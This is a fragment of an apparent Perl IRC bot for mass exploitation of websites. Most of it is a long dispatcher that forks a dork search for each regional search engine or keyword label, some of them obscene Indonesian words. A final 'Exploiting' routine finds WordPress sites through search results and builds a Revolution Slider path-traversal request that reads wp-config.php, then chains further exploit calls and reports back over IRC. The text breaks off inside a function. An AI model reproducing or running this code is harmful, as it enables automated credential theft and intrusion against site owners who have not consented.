        if ($engine =~ /cameroon/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cameroon",$type,$nick); } exit; } }

        if ($engine =~ /christmas/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Christmas",$type,$nick); } exit; } }

        if ($engine =~ /costarika/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CostaRika",$type,$nick); } exit; } }

        if ($engine =~ /croatia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Croatia",$type,$nick); } exit; } }

        if ($engine =~ /cuba/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cuba",$type,$nick); } exit; } }

        if ($engine =~ /cyprus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cyprus",$type,$nick); } exit; } }

        if ($engine =~ /dominican/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Dominican",$type,$nick); } exit; } }

        if ($engine =~ /equador/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Equador",$type,$nick); } exit; } }

        if ($engine =~ /egypt/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Egypt",$type,$nick); } exit; } }

        if ($engine =~ /estonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Estonia",$type,$nick); } exit; } }

        if ($engine =~ /finland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Finland",$type,$nick); } exit; } }

        if ($engine =~ /georgia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Georgia",$type,$nick); } exit; } }

        if ($engine =~ /ghana/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ghana",$type,$nick); } exit; } }

        if ($engine =~ /grenada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Grenada",$type,$nick); } exit; } }

        if ($engine =~ /honduras/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Honduras",$type,$nick); } exit; } }

        if ($engine =~ /hongkong/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hongkong",$type,$nick); } exit; } }

        if ($engine =~ /iceland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iceland",$type,$nick); } exit; } }    

        if ($engine =~ /ireland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ireland",$type,$nick); } exit; } }

        if ($engine =~ /kenya/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kenya",$type,$nick); } exit; } }

        if ($engine =~ /kuwait/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kuwait",$type,$nick); } exit; } }

        if ($engine =~ /laos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Laos",$type,$nick); } exit; } }

        if ($engine =~ /latvia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Latvia",$type,$nick); } exit; } }

        if ($engine =~ /liberia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Liberia",$type,$nick); } exit; } }

        if ($engine =~ /libyan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Libyan",$type,$nick); } exit; } }

        if ($engine =~ /lithuania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Lithuania",$type,$nick); } exit; } }

        if ($engine =~ /macedonia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Macedonia",$type,$nick); } exit; } }

        if ($engine =~ /malta/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malta",$type,$nick); } exit; } }

        if ($engine =~ /mongolia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mongolia",$type,$nick); } exit; } }

        if ($engine =~ /mozambique/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mozambique",$type,$nick); } exit; } }

        if ($engine =~ /namibia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Namibia",$type,$nick); } exit; } }

        if ($engine =~ /nauru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nauru",$type,$nick); } exit; } }

        if ($engine =~ /nepal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nepal",$type,$nick); } exit; } }

        if ($engine =~ /newzealand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"NewZealand",$type,$nick); } exit; } }

        if ($engine =~ /nigeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Nigeria",$type,$nick); } exit; } }

        if ($engine =~ /paraguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Paraguay",$type,$nick); } exit; } }

        if ($engine =~ /peru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Peru",$type,$nick); } exit; } }

        if ($engine =~ /portugal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Portugal",$type,$nick); } exit; } }

        if ($engine =~ /puertorico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }

        if ($engine =~ /qatar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PuertoRico",$type,$nick); } exit; } }

        if ($engine =~ /saintlucia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaintLucia",$type,$nick); } exit; } }

        if ($engine =~ /samoa/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Samoa",$type,$nick); } exit; } }

        if ($engine =~ /saudiarabia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SaudiArabia",$type,$nick); } exit; } }

        if ($engine =~ /senegal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Senegal",$type,$nick); } exit; } }

        if ($engine =~ /slovakia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovakia",$type,$nick); } exit; } }

        if ($engine =~ /srilanka/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Srilanka",$type,$nick); } exit; } }

        if ($engine =~ /swaziland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Swaziland",$type,$nick); } exit; } }

        if ($engine =~ /tajikistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tajikistan",$type,$nick); } exit; } }

        if ($engine =~ /tanzania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tanzania",$type,$nick); } exit; } }

        if ($engine =~ /tokelau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tokelau",$type,$nick); } exit; } }

        if ($engine =~ /tonga/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tonga",$type,$nick); } exit; } }

        if ($engine =~ /tunisia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tunisia",$type,$nick); } exit; } }

        if ($engine =~ /uruguay/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uruguay",$type,$nick); } exit; } }

        if ($engine =~ /uzbekistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uzbekistan",$type,$nick); } exit; } }

        if ($engine =~ /venezuela/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Venezuela",$type,$nick); } exit; } }

        if ($engine =~ /yemen/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yemen",$type,$nick); } exit; } }

        if ($engine =~ /yugoslavia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Yugoslavia",$type,$nick); } exit; } }

        if ($engine =~ /zambia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zambia",$type,$nick); } exit; } }

        if ($engine =~ /uganda/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Uganda",$type,$nick); } exit; } }

        if ($engine =~ /trinidad/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Trinidad",$type,$nick); } exit; } }

        if ($engine =~ /zimbabwe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Zimbabwe",$type,$nick); } exit; } }

        if ($engine =~ /kontol/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"KonToL",$type,$nick);    } exit; }}

		if ($engine =~ /pepek/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"PePek",$type,$nick);

                } exit; }

    }  

		if ($engine =~ /tetek/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

            &type($chan,$bug,$dork,"TeTek",$type,$nick);

        } exit; }

    }

		if ($engine =~ /itil/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

        &type($chan,$bug,$dork,"ItiL",$type,$nick);

        } exit; }

    }                          

        if ($engine =~ /vagina/i) {

    if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

        &type($chan,$bug,$dork,"Vagina",$type,$nick);

        } exit; }

    }  

        if ($engine =~ /nennen/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"NenNen",$type,$nick);

                } exit; }

    }

        if ($engine =~ /susu/i) {

        if (my $pid = fork) { waitpid($pid, 0); }

        else { if (fork) { exit; } else {

                &type($chan,$bug,$dork,"SuSu",$type,$nick);

                } exit; }

    }          

        if ($engine =~ /buahdada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BuahDada",$type,$nick); } exit; } }

        if ($engine =~ /payudara/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"PayuDara",$type,$nick); } exit; } }

        if ($engine =~ /kentot/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kentot",$type,$nick); } exit; } }

        if ($engine =~ /memek/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"MeMek",$type,$nick); } exit; } }

        if ($engine =~ /emel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"eMeL",$type,$nick); } exit; } }

        if ($engine =~ /oral/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"OraL",$type,$nick); } exit; } }

        if ($engine =~ /klitoris/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Klitoris",$type,$nick); } exit; } }

        if ($engine =~ /masturbasi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Masturbasi",$type,$nick); } exit; } }

        if ($engine =~ /onani/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Onani",$type,$nick); } exit; } }

        if ($engine =~ /sperma/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sperma",$type,$nick); } exit; } }

        if ($engine =~ /anal/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AnaL",$type,$nick); } exit; } }

        if ($engine =~ /puting/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Puting",$type,$nick); } exit; } }

        if ($engine =~ /penis/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Penis",$type,$nick); } exit; } }

        if ($engine =~ /googleCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCA",$type,$nick); } exit; } }

        if ($engine =~ /googleDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDE",$type,$nick); } exit; } }

        if ($engine =~ /googleUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUK",$type,$nick); } exit; } }

        if ($engine =~ /googleFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeFR",$type,$nick); } exit; } }

        if ($engine =~ /googleES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeES",$type,$nick); } exit; } }

        if ($engine =~ /googleIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIT",$type,$nick); } exit; } }

        if ($engine =~ /googleNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNL",$type,$nick); } exit; } }

        if ($engine =~ /googleBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBE",$type,$nick); } exit; } }

        if ($engine =~ /googleCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCH",$type,$nick); } exit; } }

        if ($engine =~ /googleSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeSE",$type,$nick); } exit; } }

        if ($engine =~ /googleDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeDK",$type,$nick); } exit; } }

        if ($engine =~ /googleNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNO",$type,$nick); } exit; } }

        if ($engine =~ /googleNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeNZ",$type,$nick); } exit; } }

        if ($engine =~ /googleIE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIE",$type,$nick); } exit; } }

        if ($engine =~ /googleBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeBR",$type,$nick); } exit; } }

        if ($engine =~ /googleAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAR",$type,$nick); } exit; } }

        if ($engine =~ /googleCO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCO",$type,$nick); } exit; } }

        if ($engine =~ /googleCU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCU",$type,$nick); } exit; } }

        if ($engine =~ /googleCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCL",$type,$nick); } exit; } }

        if ($engine =~ /googleMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMX",$type,$nick); } exit; } }

        if ($engine =~ /googleAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAU",$type,$nick); } exit; } }

        if ($engine =~ /googleRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRU",$type,$nick); } exit; } }

        if ($engine =~ /googleAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeAT",$type,$nick); } exit; } }

        if ($engine =~ /googlePL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePL",$type,$nick); } exit; } }

        if ($engine =~ /googleIL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIL",$type,$nick); } exit; } }

        if ($engine =~ /googleTR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTR",$type,$nick); } exit; } }

        if ($engine =~ /googleUA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeUA",$type,$nick); } exit; } }

        if ($engine =~ /googleGR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeGR",$type,$nick); } exit; } }

        if ($engine =~ /googleJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeJP",$type,$nick); } exit; } }

        if ($engine =~ /googleCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeCN",$type,$nick); } exit; } }

        if ($engine =~ /googleMY/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeMY",$type,$nick); } exit; } }

        if ($engine =~ /googleTH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTH",$type,$nick); } exit; } }

        if ($engine =~ /googleIN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeIN",$type,$nick); } exit; } }

        if ($engine =~ /googleKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeKR",$type,$nick); } exit; } }

        if ($engine =~ /googleRO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeRO",$type,$nick); } exit; } }

        if ($engine =~ /googleTW/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeTW",$type,$nick); } exit; } }

        if ($engine =~ /googleZA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLeZA",$type,$nick); } exit; } }

        if ($engine =~ /googlePT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"GooGLePT",$type,$nick); } exit; } }

        if ($engine =~ /bingDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDE",$type,$nick); } exit; } }

        if ($engine =~ /bingUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingUK",$type,$nick); } exit; } }

        if ($engine =~ /bingCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCA",$type,$nick); } exit; } }

        if ($engine =~ /bingBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBR",$type,$nick); } exit; } }

        if ($engine =~ /bingFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingFR",$type,$nick); } exit; } }

        if ($engine =~ /bingES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingES",$type,$nick); } exit; } }

        if ($engine =~ /bingIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingIT",$type,$nick); } exit; } }

        if ($engine =~ /bingBE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingBE",$type,$nick); } exit; } }

        if ($engine =~ /bingNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNL",$type,$nick); } exit; } }

        if ($engine =~ /bingPT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingPT",$type,$nick); } exit; } }

        if ($engine =~ /bingNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNO",$type,$nick); } exit; } }

        if ($engine =~ /bingDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingDK",$type,$nick); } exit; } }

        if ($engine =~ /bingSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingSE",$type,$nick); } exit; } }

        if ($engine =~ /bingCH/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCH",$type,$nick); } exit; } }

        if ($engine =~ /bingNZ/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingNZ",$type,$nick); } exit; } }

        if ($engine =~ /bingRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingRU",$type,$nick); } exit; } }

        if ($engine =~ /bingJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingJP",$type,$nick); } exit; } }

        if ($engine =~ /bingCN/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCN",$type,$nick); } exit; } }

        if ($engine =~ /bingKR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingKR",$type,$nick); } exit; } }

        if ($engine =~ /bingMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingMX",$type,$nick); } exit; } }

        if ($engine =~ /bingAR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAR",$type,$nick); } exit; } }

        if ($engine =~ /bingCL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingCL",$type,$nick); } exit; } }

        if ($engine =~ /bingAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"BingAU",$type,$nick); } exit; } }

        if ($engine =~ /askCA/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKCA",$type,$nick); } exit; } }

        if ($engine =~ /askDE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDE",$type,$nick); } exit; } }

        if ($engine =~ /askIT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKIT",$type,$nick); } exit; } }

        if ($engine =~ /askFR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKFR",$type,$nick); } exit; } }

        if ($engine =~ /askES/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKES",$type,$nick); } exit; } }

        if ($engine =~ /askRU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKRU",$type,$nick); } exit; } }

        if ($engine =~ /askNL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNL",$type,$nick); } exit; } }

        if ($engine =~ /askUK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKUK",$type,$nick); } exit; } }

        if ($engine =~ /askBR/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKBR",$type,$nick); } exit; } }

        if ($engine =~ /askPL/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKPL",$type,$nick); } exit; } }

        if ($engine =~ /askAU/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAU",$type,$nick); } exit; } }

        if ($engine =~ /askAT/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKAT",$type,$nick); } exit; } }

        if ($engine =~ /askJP/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKJP",$type,$nick); } exit; } }

        if ($engine =~ /askSE/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKSE",$type,$nick); } exit; } }

        if ($engine =~ /askMX/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKMX",$type,$nick); } exit; } }

        if ($engine =~ /askNO/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKNO",$type,$nick); } exit; } }

        if ($engine =~ /askDK/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"AsKDK",$type,$nick); } exit; } }

		

}

 

#########################################       Exploiting

 

sub revslider() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $nick = $_[4];

    my $count = 0;

		my @list = &search_engine($chan,$bug,$dork,$engine,$revlogo,$nick);

		my $num = scalar(@list);

		if ($num > 0) {

			foreach my $site (@list) { 

				$count++; 

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

		my $test = "http://".$site.$bug; 

		my $luph = "http://".$site."wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"; 

		my $html = &get_content($test); 

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { 

		if ($html =~ /0/ || $html =~ m/1 0/i ) {

		&finder($chan,$site,$engine,$nick,$revlogo);sleep(5);

		&satu_xpl($test,$chan,$site,$engine,$nick);sleep(5);

		&tiga_xpl($test,$chan,$site,$engine,$nick);sleep(5);

		&finder2($chan,$site,$engine,$nick,$revlogo);sleep(5);

		&empat_xpl($test,$chan,$site,$engine,$nick);sleep(5);

		&limo_xpl($test,$chan,$site,$engine,$nick);sleep(5);

		&finder3($chan,$site,$engine,$nick,$revlogo);sleep(5);

		#&mailer($chan,$site,$engine,$nick,$revlogo);sleep(2);

#		&bogex2($luph,$chan,$site,$engine,$nick);sleep(2);

			} else { }

            } exit; }

        }

    }

}

	

sub satu_xpl() {

